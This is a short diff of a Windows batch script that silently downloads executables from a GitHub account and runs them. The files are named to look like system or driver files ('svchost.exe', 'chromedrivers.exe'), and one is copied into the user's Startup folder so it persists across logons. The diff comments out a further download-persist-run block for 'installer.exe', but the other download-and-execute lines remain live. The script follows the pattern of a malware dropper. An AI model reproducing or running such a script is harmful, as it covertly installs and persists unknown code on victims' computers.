@@ -10,6 +10,7 @@ xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Window
 chromedrivers.exe
 curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
 svchost.exe
-curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
-xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-installer.exe
+REM curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
+REM xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+REM installer.exe
+exit
